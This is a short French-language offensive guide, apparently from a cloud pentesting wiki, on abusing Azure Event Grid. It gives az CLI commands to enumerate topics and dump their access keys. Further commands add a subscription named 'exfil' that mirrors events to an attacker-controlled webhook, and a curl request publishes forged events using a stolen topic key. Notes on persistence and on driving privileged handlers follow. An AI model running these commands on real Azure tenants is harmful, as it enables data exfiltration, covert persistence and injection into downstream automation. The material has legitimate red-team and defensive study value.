---
title: "Event Grid : intercepter et injecter des événements via les subscriptions"
order: 3
description: "Abuser des topics et subscriptions Azure Event Grid pour intercepter ou injecter des événements."
keywords:
  - Event Grid
  - topic
  - subscription
  - événement
  - injection
---

# Event Grid

Event Grid achemine les événements des éditeurs (ressources Azure ou topics personnalisés) vers les gestionnaires via des **event subscriptions**. Avec un accès en écriture aux subscriptions d'un topic, vous ajoutez une subscription qui livre une copie de chaque événement correspondant à un point de terminaison que vous contrôlez, et avec la clé d'accès du topic, vous publiez des événements forgés sur lesquels les gestionnaires en aval agissent.

## Énumérer les topics et subscriptions

```bash
az eventgrid topic list -o table
az eventgrid topic key list --name <topic> -g <rg>
az eventgrid event-subscription list --source-resource-id <topic-resource-id> -o table
```

## Intercepter et injecter

```bash
# add a subscription that mirrors events to an attacker-controlled webhook
az eventgrid event-subscription create \
  --name exfil --source-resource-id <topic-resource-id> \
  --endpoint https://attacker.example/collect

# publish a forged event with the topic key (handlers trust the topic)
curl -X POST "<topic-endpoint>" -H "aeg-sas-key: <topic-key>" \
  -d '[{"id":"1","eventType":"forged","subject":"x","dataVersion":"1.0","data":{"cmd":"run"}}]'
```

## Notes d'exploitation

- Une subscription miroir est à la fois de la persistance et de la capture : elle continue de livrer les événements jusqu'à ce qu'un opérateur remarque la subscription supplémentaire.
- Les événements forgés atteignent tout ce vers quoi le topic diffuse (Functions, Logic Apps, webhooks), donc un événement d'apparence fiable peut piloter de l'automatisation ou des gestionnaires privilégiés.
- Les system topics sur les ressources Azure (stockage, groupes de ressources) laissent fuiter du signal opérationnel (blob créé, ressource modifiée) utile au timing et au ciblage.

## Outils

- **Azure CLI** (`az eventgrid`) : gestion des topics, clés et subscriptions.
- **MicroBurst** : fait ressortir les clés de topic depuis la configuration et les Key Vaults.

## Références

- [HackTricks Cloud : Azure Event Grid](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
- [NetSPI : MicroBurst](https://github.com/NetSPI/MicroBurst)
- [Microsoft : sécurité et authentification Event Grid](https://learn.microsoft.com/azure/event-grid/security-authentication)
